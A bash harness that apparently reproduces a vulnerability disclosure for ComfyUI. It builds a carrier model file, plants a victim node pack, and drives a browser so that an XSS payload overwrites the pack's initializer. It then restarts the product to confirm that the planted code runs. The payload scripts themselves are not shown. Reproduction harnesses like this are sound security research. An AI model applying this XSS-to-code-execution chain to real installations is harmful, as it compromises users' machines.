#!/usr/bin/env bash
# One-shot end-to-end reproduction. The exit code IS the verdict.
#
#   build carrier -> plant victim env -> start the REAL product -> drive a real
#   browser through the real UI (the payload in the model file does the rest)
#   -> stop -> prove the initializer was overwritten -> REAL restart
#   -> prove the overwritten initializer executed -> stop.
#
# Nothing here calls the vulnerable routes. The browser does, from the page's own
# origin, because that is the vulnerability.
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=env.sh
source "$HERE/env.sh"
export RUN_DIR ART_DIR COMFY_ROOT MARKER_PATH PYTHON COMFY_SHA NODE_SHA STAGED_SHA
RUN_DIR="$RUN_DIR"

say() { echo; echo "=== $* ==="; }

say "reset run state"
mkdir -p "$RUN_DIR" "$ART_DIR"
rm -f "$MARKER_PATH" "$RUN_DIR"/restart.json "$RUN_DIR"/drive.json "$RUN_DIR"/product.start*.log
rm -rf "$RUN_DIR"/shots
rm -rf "$COMFY_ROOT"/temp/staged_init*.py 2>/dev/null

say "build carrier + inert staged initializer"
"$PYTHON" "$HERE/make_poc.py" || exit 9
STAGED_SHA="$(sha256sum "$ART_DIR/staged_init.py" | cut -d' ' -f1)"
echo "$STAGED_SHA" > "$RUN_DIR/staged.sha256"
export STAGED_SHA
echo "staged initializer sha256 = $STAGED_SHA"

say "plant victim environment"
"$PYTHON" "$HERE/plant.py" || exit 9

say "start the real product (run 1 -- the attack)"
bash "$HERE/start_product.sh" || exit 10
cat "$RUN_DIR/product.pid" > "$RUN_DIR/attack_pid.txt"
echo "attack-phase pid = $(cat "$RUN_DIR/attack_pid.txt")"

say "drive a real browser through the real UI"
"$PYTHON" "$HERE/drive.py"
DRIVE_RC=$?
echo "drive exit=$DRIVE_RC"

say "stop the product"
bash "$HERE/stop_product.sh"

say "state on disk after the attack"
echo "victim initializer before: $(cat "$RUN_DIR/victim_init.before.sha256")"
echo "victim initializer now   : $(sha256sum "$COMFY_ROOT/custom_nodes/Victim-Demo-Pack/__init__.py" | cut -d' ' -f1)"
echo "staged initializer       : $STAGED_SHA"
echo "marker present (want no) : $([ -e "$MARKER_PATH" ] && echo yes || echo no)"

say "REAL restart (run 2)"
date +%s > "$RUN_DIR/restart_epoch.txt"
bash "$HERE/start_product.sh" || exit 11
echo "restart-phase pid = $(cat "$RUN_DIR/product.pid")"

say "verify the overwritten initializer executed"
"$PYTHON" "$HERE/verify_restart.py"
VERIFY_RC=$?

say "stop the product"
bash "$HERE/stop_product.sh"

say "verdict"
"$PYTHON" - <<'PY'
import json, os, pathlib
run = pathlib.Path(os.environ["RUN_DIR"])
d = json.loads((run / "drive.json").read_text())
r = json.loads((run / "restart.json").read_text())
ok = (d["xss_confirmed"] and d["payload_ran"] and d["staged_overwrite"]
      and d["negative_control_clean"] and d["control_handler_alive"]
      and r["verdict"] == "EXECUTED")
print("xss_confirmed        :", d["xss_confirmed"])
print("payload_ran          :", d["payload_ran"])
print("staged_overwrite     :", d["staged_overwrite"])
print("negative_control     :", d["negative_control_clean"])
print("control_handler_alive:", d["control_handler_alive"])
print("restart              :", r["verdict"])
print("OVERALL              :", "D4_end_to_end_safe" if ok else "FAILED")
raise SystemExit(0 if ok else 1)
PY
FINAL=$?
[ "$DRIVE_RC" -eq 0 ] || echo "note: drive.py exited $DRIVE_RC"
[ "$VERIFY_RC" -eq 0 ] || echo "note: verify_restart.py exited $VERIFY_RC"
exit $FINAL
